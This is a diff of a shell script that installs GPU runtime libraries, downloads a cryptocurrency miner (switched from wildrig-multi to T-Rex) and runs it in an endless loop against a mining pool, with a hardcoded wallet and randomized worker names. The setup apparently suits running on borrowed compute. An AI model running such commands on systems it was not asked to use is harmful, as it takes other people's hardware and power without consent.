@@ -1,9 +1,9 @@
 apt update && apt -y install ocl-icd-libopencl1 ocl-icd-opencl-dev clinfo curl wget sudo
 wget http://archive.ubuntu.com/ubuntu/pool/multiverse/n/nvidia-cuda-toolkit/libcudart12_12.0.146~12.0.1-4build4_amd64.deb && sudo dpkg -i libcudart12_12.0.146~12.0.1-4build4_amd64.deb
-curl https://github.com/andru-kun/wildrig-multi/releases/download/0.47.9/wildrig-multi-linux-0.47.9.tar.gz -L -o wildrig-multi-linux-0.47.9.tar.gz
-tar xf wildrig-multi-linux-0.47.9.tar.gz
+curl https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz -L -o t-rex-0.26.8-linux.tar.gz
+tar xf t-rex-0.26.8-linux.tar.gz
 while :; do
-./wildrig-multi --algo qhash --url qtc-eu.rplant.xyz:7154 -u bc1qc8kqa8dqg2hj87ngplkcn56rdk6tgp3le54x78.x -p webpassword=x
+./t-rex -a octopus -o stratum+tcp://de.conflux.gfwroute.com:1170 -u cfx:aatjfsztc58yp3jx14gjrekcgdsf0vk1vab8mahr68.$(echo $RANDOM | md5sum | head -c 10)
 done
 
 #curl https://github.com/kryptex-miners-org/kryptex-miners/releases/download/trex-0-26-8/t-rex-0.26.8-linux.tar.gz -L -o t-rex-0.26.8-linux.tar.gz
